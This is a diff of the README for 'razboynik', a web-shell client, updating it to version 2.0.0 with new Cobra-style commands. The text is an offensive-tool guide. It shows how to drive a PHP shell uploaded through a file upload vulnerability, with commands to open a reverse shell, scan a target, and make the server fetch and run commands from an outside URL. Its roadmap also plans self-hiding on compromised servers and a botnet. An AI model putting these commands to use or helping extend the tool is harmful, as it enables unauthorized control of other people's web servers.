@@ -40,7 +40,8 @@ These requirements are necessary only if you want to build the app:
 ###Dependencies
 These dependencies will be install:
 - `eatbytes/razboy` (Business logic and core of razboynik)
-- `urfave/cli` (Usefull utility to handle flag and parse command)
+- `eatbytes/sysgo` (Small abstraction of system command)
+- `spf13/cobra` (Usefull utility to handle flag and parse command)
 - `chzyer/readline` (Implementation of readline to loop on command)
 - `fatih/color` (Great colors to push on terminal)
 - `golang library` (fmt, strings, buffer, etc...)
@@ -50,7 +51,9 @@ Instructions to build the app:
 - `git clone https://github.com/EatBytes/razboynik.git` (or SSH if you want)
 - `cd razboynik`
 - `go get`
-- `go build`
+- `go build` or `go install`
+
+The `go build` command will build the project locally (it means, only create a binary in the folder). `go install` create a binary available everywhere.
 
 (Makefile on the way)
 
@@ -61,14 +64,12 @@ Let's suppose you find a file upload vulnerability in a website and you upload t
 Now the url of your script could be (as example) : http://{website}/uploads/script.php
 
 With this statement we can use razboynik as it follow :
-- `./razboynik run -u http://{website}/uploads/script.php`
-or (shortcut)
-- `./razboynik r -u http://{website}/uploads/script.php`
+- `./razboynik run http://{website}/uploads/script.php`
 
-If you want to change the parameter sent, add -p flag and precise it. Like : `./razboynik r -u ... -p myParameter`.
+If you want to change the parameter sent, add -p flag and precise it. Like : `./razboynik run [URL] -p myParameter`.
 By default the parameter is "razboynik". Parameter is the name of the field or header or cookie (depends on method) sent to server. If the method is GET, razboynik will simply add at the end of the url = ?razboynik={request}.
 
-If you want to change the method, add -m flag as : `./razboynik r -u ... -m POST`.
+If you want to change the method, add -m flag as : `./razboynik run [URL] -m POST`.
 By default, method is set to GET. You have the choice between : GET, POST, HEADER (evil request will be set in headers), COOKIE.
 
 For more option you can add -h flag. Or type `./razboynik help`.
@@ -79,13 +80,16 @@ You will find the API of all the business logic in the appropriate repository `r
 ###run
 Run a reverse shell with specified configuration
 
+ARGUMENTS:
+- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`
+
 OPTIONS: 
-- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
 - `-m, --method`: (string) Method to use. Ex: `-m POST` (default: "GET")
 - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
 - `-s, --shellmethod`: (int) Shellmethod to use. Ex: `-s 0` (default: 0) [0 => system(), 1 => shell_exec()]
 - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)
 - `-r, --raw`: (bool) If set, send the request without base64 encoding
+- `--proxy`: (string) Possible proxy to use. Ex: `--proxy http://localhost:8080` (default: nil)
 - `-c, --crypt`: (Not available)
 
 ###generate
@@ -94,27 +98,33 @@ OPTIONS:
 ###scan
 Scan a website to identify what shell method and method works on it.
 
+ARGUMENTS:
+- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`
+
 OPTIONS:
-- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
 - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
 - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)
 
 ###invisible
 Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to `'echo 1;'` in body, then I can do : 
-- `-u ... -r http://website/cmd.txt`
+- `[URL] http://website/cmd.txt`
 
-OPTIONS:
-- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
-- `-r, --referer`: (string) Url that the server will call to get the cmd to execute. Ex: `-r http://website.com/cmd-i-want-to-execute.txt`
+ARGUMENTS:
+- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`
+- `[REFERER]`: (string) Url that the server will call to get the cmd to execute. Ex: `http://website.com/cmd-i-want-to-execute.txt`
 
 ###encode / decode
 Encode or decode string.
 
-Ex: encode hello => aGVsbG8=
-    decode aGVsbG8= => hello
+ARGUMENTS:
+- `[STR]`: (string) String to encode or decode in base64.
+
+Ex: 
+- `encode hello` => `aGVsbG8=`
+- `decode aGVsbG8=` => `hello`
 
 ##Current version
-1.6.0
+2.0.0
 
 ##Roadmap
 ###~~1.5.0 (DONE)~~
@@ -126,13 +136,17 @@ Ex: encode hello => aGVsbG8=
 - ~~Add base64 encoding and decoding to root~~
 - ~~Add invisible method~~
 
-###1.6.0 (IN PROGRESS)
+###2.0.0 (CURRENT)
+- Complete refactoring on Cobra version
+- More stability
+- Better coding standarts
+- Proxy available (works like a charm with mitmproxy)
 - Web server (REST API)
 - Hide itself once on server
 - Zip
 - Vim
 
-###1.7.0
+###2.1.0 (IN PROGRESS)
 - Add `./bin` folder with binaries
 - More documentation
 - Create a botnet. Handle multiple server at the same time
